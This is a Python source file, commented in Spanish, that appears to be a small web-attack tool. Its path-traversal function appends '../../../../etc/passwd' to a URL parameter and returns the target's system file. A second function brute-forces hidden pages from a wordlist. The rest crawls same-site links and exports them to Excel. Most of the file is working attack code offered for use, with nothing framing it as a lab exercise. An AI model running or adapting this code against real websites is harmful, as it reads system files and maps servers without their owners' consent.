import re
import requests
import time
from bs4 import BeautifulSoup
from pwn import *
from urllib.parse import urljoin
import openpyxl
from openpyxl.styles import Font

def path_traversal(url):
    p1 = log.progress("Path traversal")
    p1.status("Buscando vulnerabilidad...")
    time.sleep(4)
    try:
        r = re.search("=",url)

    except:
        print("Url invalida")
        return False

    if r is not None:
        print("Hay una posible vulnerabilidad...")
        time.sleep(1)
        nuevo = r.end()
        lista = []
        url_nueva = "" 
        for i in url:
            lista.append(i)

        for i in range(len(lista) - 1, - 1, - 1):
            if nuevo<=i:
                del lista[i]

        for i in lista:
            url_nueva+=i

        url_vulnerable = url_nueva + "/../../../../../../etc/passwd"

        r = requests.get(url_vulnerable)

        p1.status(f"Probando la url: {url_vulnerable}")
        time.sleep(4)

        if r.status_code == 200:

            soup = BeautifulSoup(r.content, 'html.parser')
            texto_visible = soup.get_text()      
            texto_visible_limpio = '\n'.join(line.strip() for line in texto_visible.split('\n') if line.strip())

            return texto_visible_limpio
      
        else:
            return 'No es vulnerable a path traversal'

    else:
        return"No hay una entrada para el ataque..."

def vuln_cambio_pag(url,diccionario):
    #C:\Users\ajosu\OneDrive\Escritorio\ejemplo.txt
    try:
        with open(diccionario, "r") as file:
            i = 0
            r = re.findall("/",url)
            nueva_url = ""
            for letra in url:
                if letra == "/":
                    nueva_url+=letra
                    i+=1
                else:
                    nueva_url+=letra

                if i==len(r):
                    nueva_url += "/"
                    break

            lista = []
            for line in file:
                r = requests.get(nueva_url + line.strip())
                if r.status_code == 200:
                    lista.append(nueva_url + line.strip())

        return lista

    except FileNotFoundError as e:
        print('La ruta no es valida, intenta cambiar "\\" por "\\\\":', e)
        return True
  
    except:
        print("No se logro la conexion con la url...")
        return False

def obtener_enlaces(url,url_base):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            enlaces = []
            for link in soup.find_all('a'):
                href = link.get('href')
                if href:
                    enlace_completo = urljoin(url, href)
                    if enlace_completo.startswith(url_base):
                        enlaces.append(enlace_completo)
            return enlaces
        else:
            print(f"Error al obtener la página {url}.")
            return []
    except Exception as e:
        print(f"Error al obtener la página {url}: {e}")
        return False

def guardar_enlaces_en_excel(enlaces, nombre = 'Enlaces_Encontrados'):
    try:
        # Crear un nuevo libro de trabajo
        wb = openpyxl.Workbook()
        # Seleccionar la primera hoja
        hoja = wb.active
        hoja.cell(row = 1, column = 1, value = "Numero")
        hoja.cell(row = 1, column = 2, value = "Enlaces Encontrados")
        hoja['A1'].font = Font(color = '7D2181', bold = True)
        hoja['B1'].font = Font(color = '0000FF', bold = True)
      
        # Iterar sobre los enlaces y escribir cada uno en una fila
        for i, enlace in enumerate(enlaces, start = 1):
            hoja.cell(row = i + 1, column = 1 , value = i)
            hoja.cell(row = i + 1 , column = 2, value = enlace)

        # Guardar el libro de trabajo
        wb.save(nombre + ".xlsx")
        print(f'Archivo {nombre}.xlsx guardado con éxito.')
    except:
        print("Error al crear archivo .xlsx")

def enlace(url):
    try:
        enlaces_visitados = set()
        enlaces_por_visitar = set([url])
        enlaces_encontrados = []
        i = 1
        while enlaces_por_visitar:
            if i<=20:
                url_actual = enlaces_por_visitar.pop()
                if url_actual in enlaces_visitados:
                    continue
                enlaces_visitados.add(url_actual)
                print(url_actual)
                enlaces_encontrados.append(url_actual)
              
                enlaces = obtener_enlaces(url_actual, url)
                for enlace in enlaces:
                    if enlace not in enlaces_visitados:
                        enlaces_por_visitar.add(enlace)
                        i+=1
            else:
                break
        guardar_enlaces_en_excel(enlaces_encontrados)
        return True
  
    except Exception as e:
        print("Error:", e)
        return False